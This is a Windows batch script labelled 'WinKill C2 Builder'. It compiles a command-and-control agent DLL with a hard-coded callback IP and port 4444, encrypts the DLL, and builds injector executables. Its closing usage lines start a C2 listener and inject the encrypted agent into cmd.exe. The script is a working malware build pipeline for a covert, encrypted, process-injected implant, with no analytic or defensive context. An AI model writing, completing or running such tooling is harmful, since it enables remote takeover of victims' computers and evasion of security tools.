@echo off
set IP=192.168.102.167
set PORT=4444
if not "%1"=="" set IP=%1
if not "%2"=="" set PORT=%2

echo import socket,struct > _tmp.py
echo print(hex(struct.unpack('^<I',socket.inet_aton('%IP%'))[0])) >> _tmp.py
for /f %%i in ('python _tmp.py') do set IPHEX=%%i
del _tmp.py

echo ============================================
echo   WinKill C2 Builder - C2: %IP%:%PORT%
echo   IP hex: %IPHEX%
echo ============================================

echo [1/5] agent.dll...
gcc -O2 -s -m64 -shared -fno-ident -DC2_IP=%IPHEX% -DC2_PORT=%PORT% -o agent.dll agent_source.c -lws2_32 || goto :err

echo [2/5] encrypt.exe...
gcc -O2 -s -m64 -fno-ident -o encrypt.exe encrypt_source.c || goto :err

echo [3/5] agent.dll.enc...
encrypt.exe agent.dll || goto :err

echo [4/5] injector_enc.exe...
gcc -O2 -s -m64 -fno-ident -o injector_enc.exe injector_enc_source.c || goto :err

echo [5/5] injector.exe...
gcc -O2 -s -m64 -fno-ident -o injector.exe injector_source.c || goto :err

echo.
echo Done!
echo   Server:  python c2_server.py 0.0.0.0 %PORT%
echo   Inject:  injector_enc.exe agent.dll.enc cmd.exe
echo   Standalone: runner.exe agent_exe.exe.enc
goto :end

:err
echo BUILD FAILED!
:end
